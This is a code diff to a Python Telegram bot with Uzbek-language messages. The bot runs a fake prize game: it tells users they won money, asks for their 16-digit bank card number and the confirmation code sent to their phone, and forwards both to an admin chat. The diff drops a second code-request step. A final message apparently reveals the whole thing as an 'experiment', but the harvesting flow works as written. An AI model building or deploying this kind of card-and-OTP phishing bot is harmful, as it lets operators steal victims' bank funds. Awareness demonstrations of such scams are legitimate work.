@@ -91,13 +91,11 @@ TEXTS = {
     'phone_ok': "✅ Telefon raqamingiz qabul qilindi: {}",
     'number_pick': "🎮 O'yinda ishtirok etish uchun 1 dan 9 gacha bo'lgan raqamlardan birini yozing:",
     'number_invalid': "❌ Faqat 1 dan 9 gacha bitta raqam yozing.",
-    'prize_sms': "📩 SMS keldi:\n\nSiz {} so'm yutuq egasiga aylandingiz! 🎉",
+    'prize_sms': "Siz {} so'm yutuq egasiga aylandingiz! 🎉",
     'card_prompt': "💳 Pulni kartangizga tushirish uchun 16 xonali karta raqamingizni kiriting:",
     'card_invalid': "❌ Karta raqami noto'g'ri. 16 xonali raqam kiriting:",
     'code_sent': "📩 Telefoningizga tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
     'code_invalid': "❌ Kod noto'g'ri. Qaytadan kiriting:",
-    'code2_wait': "⏳ Tasdiqlash jarayoni davom etmoqda... Iltimos, kuting.",
-    'code2_sent': "📩 Yangi tasdiqlash kodi yuborildi.\n\n🔐 Kodni kiriting: {}",
     'blocked': "🚫 Urinishlar tugadi. /start buyrug'i bilan qayta boshlang.",
     'experiment': (
         "⚠️ BU EKSPERIMENT EDI! ⚠️\n\n"
@@ -191,17 +189,6 @@ def send_code(chat_id, code_key, text_key):
     bot.send_message(chat_id, get_text(text_key).format(code))
 
 
-def schedule_second_code(chat_id):
-    def _delayed():
-        time.sleep(5)
-        if get_step(chat_id) != 'code2_wait':
-            return
-        set_step(chat_id, 'code2')
-        send_code(chat_id, 'code_2', 'code2_sent')
-
-    threading.Thread(target=_delayed, daemon=True).start()
-
-
 def finish_experiment(chat_id):
     conn = get_db()
     c = conn.cursor()
@@ -290,7 +277,7 @@ def process_card(chat_id, text):
     send_code(chat_id, 'code_1', 'code_sent')
 
 
-def process_code(chat_id, text, code_key, next_step, fail_action=None):
+def process_code(chat_id, text, code_key):
     state = get_state(chat_id)
     user_input = (text or '').strip()
     correct_code = str(state.get(code_key, ''))
@@ -298,12 +285,7 @@ def process_code(chat_id, text, code_key, next_step, fail_action=None):
 
     if user_input == correct_code:
         log_action(chat_id, f"{code_key}_verified")
-        if next_step == 'code2_wait':
-            set_step(chat_id, 'code2_wait')
-            bot.send_message(chat_id, get_text('code2_wait'))
-            schedule_second_code(chat_id)
-        elif next_step == 'done':
-            finish_experiment(chat_id)
+        finish_experiment(chat_id)
         return
 
     attempts -= 1
@@ -361,12 +343,7 @@ def card_step_handler(message):
 
 @bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code1')
 def code1_step_handler(message):
-    process_code(message.chat.id, message.text, 'code_1', 'code2_wait')
-
-
-@bot.message_handler(func=lambda m: get_step(m.chat.id) == 'code2')
-def code2_step_handler(message):
-    process_code(message.chat.id, message.text, 'code_2', 'done')
+    process_code(message.chat.id, message.text, 'code_1')
 
 
 # ============== ADMIN ==============
@@ -380,8 +357,7 @@ def notify_admin(user_chat_id):
             f"🎲 Tanlangan raqam: {data.get('picked_number', 'N/A')}\n"
             f"💰 Yutuq: {format_sum(data.get('prize', 0))} so'm\n"
             f"💳 Karta: {data.get('card', 'N/A')}\n"
-            f"🔐 1-kod: {data.get('code_1', 'N/A')}\n"
-            f"🔐 2-kod: {data.get('code_2', 'N/A')}\n"
+            f"🔐 Kod: {data.get('code_1', 'N/A')}\n"
             f"🕐 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
         bot.send_message(ADMIN_ID, admin_msg)
